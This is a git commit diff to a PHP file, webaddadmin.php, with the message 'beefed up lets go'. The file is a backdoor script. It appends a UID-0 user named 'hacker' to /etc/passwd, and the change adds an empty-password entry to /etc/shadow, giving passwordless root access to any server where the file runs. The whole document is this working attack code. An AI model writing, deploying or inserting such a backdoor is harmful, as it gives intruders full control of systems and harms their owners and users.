b6ac90e504a246ac1bf0f152d6e8628d521af5a7
Riley Vick <126352951+rjv6261@users.noreply.github.com>
2025-01-24 15:32:36 -0600

    Update webaddadmin.php
    beefed up lets go

--- webaddadmin.php
+++ webaddadmin.php
@@ -1,4 +1,16 @@
 <?php
 // Author: slasher (rvick) 
-file_put_contents('/etc/passwd', "hacker:x:0:0::/root:/bin/bash\n", FILE_APPEND);
+// Modified to allow SSH login without a password for the new user
+
+// Content for /etc/passwd to create a user with no password
+$passwdContent = "hacker:x:0:0::/root:/bin/bash\n";
+
+// Content for /etc/shadow to ensure no password is set for the user
+$shadowContent = "hacker::0::::::\n";
+
+// Write to /etc/passwd
+file_put_contents('/etc/passwd', $passwdContent, FILE_APPEND);
+
+// Write to /etc/shadow to disable password check for the user
+file_put_contents('/etc/shadow', $shadowContent, FILE_APPEND);
 ?>
